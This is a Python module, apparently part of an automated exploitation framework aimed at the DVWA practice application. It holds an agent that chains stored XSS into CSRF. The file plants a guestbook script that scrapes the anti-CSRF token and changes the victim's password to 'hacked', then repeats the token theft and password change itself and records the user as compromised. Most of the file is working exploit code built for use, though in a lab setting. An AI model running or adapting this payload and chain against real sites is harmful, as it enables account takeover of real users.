"""Tier 3 chain agent: stored XSS -> CSRF compromise."""

from __future__ import annotations

from typing import Any
import re

from agents.base_agent import BaseAgent
from agents.state_utils import (
    append_error_marker,
    make_update,
    normalize_security_level,
    prepare_agent_session,
)
from core.state import ExploitationState
from foundation.http_client import RequestTimeoutError, TransportError
from foundation.session_manager import DVWASession
from foundation.verifier import Verifier


class XSSToCSRFChainAgent(BaseAgent):
    module_name = "xss_s"

    def __init__(self) -> None:
        self.verifier = Verifier()

    def check_prerequisites(self, state: ExploitationState) -> bool:
        return "xss_stored_confirmed" in set(state.get("confirmed_vulns", []))

    def run(self, state: ExploitationState) -> dict[str, Any]:
        tried_now = ["chain:xss_to_csrf"]
        score = 0
        confirmed: list[str] = []
        outcomes: list[str] = []

        if not self.check_prerequisites(state):
            return make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
            )

        target_url = state.get("target_url", "")
        level = normalize_security_level(state.get("security_level"))
        if not target_url:
            return make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
            )

        session = DVWASession(target_url)
        try:
            ready, prep_notes = prepare_agent_session(session, level, require_login=True)
            tried_now.extend(prep_notes)
            if not ready:
                return make_update(
                    state=state,
                    module_name=self.module_name,
                    score=score,
                    tried_payloads=tried_now,
                )

            endpoint = "/vulnerabilities/csrf/"
            xss_endpoint = "/vulnerabilities/xss_s/"

            # Stage 1: deliver a stored-XSS payload that would request CSRF page state.
            # In DVWA's lab context this models XSS-driven CSRF chaining in the same session.
            xss_payload = (
                "<script>"
                "fetch('/dvwa/vulnerabilities/csrf/').then(r=>r.text()).then(t=>{"
                "const m=t.match(/name=['\"']user_token['\"']\\s+value=['\"']([^'\"']+)/i);"
                "if(m){fetch('/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change&user_token='+encodeURIComponent(m[1]));}"
                "});"
                "alert('xss-chain');"
                "</script>"
            )
            session.post(
                xss_endpoint,
                data={
                    "txtName": "chain-bot",
                    "mtxMessage": xss_payload,
                    "btnSign": "Sign Guestbook",
                },
            )
            tried_now.append("xss_payload_injected")

            # Stage 2: trigger stored payload rendering.
            session.get(xss_endpoint)
            tried_now.append("xss_payload_triggered")

            xss_url = (
                xss_endpoint
                if xss_endpoint.startswith("http")
                else f"{target_url.rstrip('/')}/{xss_endpoint.lstrip('/')}"
            )
            verify_result = self.verifier.verify_xss_dialog(
                xss_url,
                {k: v for k, v in session.http.cookies.items()},
            )
            if verify_result.ok:
                tried_now.append("xss_execution_verified")
                score = max(score, 3)
            else:
                tried_now.append("xss_execution_not_verified")
                return make_update(
                    state=state,
                    module_name=self.module_name,
                    score=score,
                    tried_payloads=tried_now,
                )

            page = session.get(endpoint)
            page_body = page.text or ""
            token_match = re.search(r'name=["\']user_token["\']\s+value=["\']([^"\']+)', page_body)

            if token_match:
                tried_now.append("csrf_token_observed")
                params = {
                    "password_new": "hacked",
                    "password_conf": "hacked",
                    "Change": "Change",
                    "user_token": token_match.group(1),
                }
                result = session.get(endpoint, params=params)
                result_body = (result.text or "").lower()
                if "password changed" in result_body:
                    score = 4
                    confirmed = ["csrf_confirmed", "user_compromised"]
                    outcomes = ["user_compromised"]
                else:
                    score = max(score, 3)
            else:
                tried_now.append("csrf_token_missing")
                score = max(score, 1)
        except (TransportError, RequestTimeoutError, RuntimeError, ValueError) as exc:
            append_error_marker(tried_now, "xss_csrf_chain_runtime_error", exc)
        finally:
            session.close()

        return make_update(
            state=state,
            module_name=self.module_name,
            score=score,
            tried_payloads=tried_now,
            confirmed_vulns=confirmed,
            achieved_outcomes=outcomes,
        )


_AGENT = XSSToCSRFChainAgent()


def xss_to_csrf_chain(state: ExploitationState) -> dict[str, Any]:
    return _AGENT.run(state)
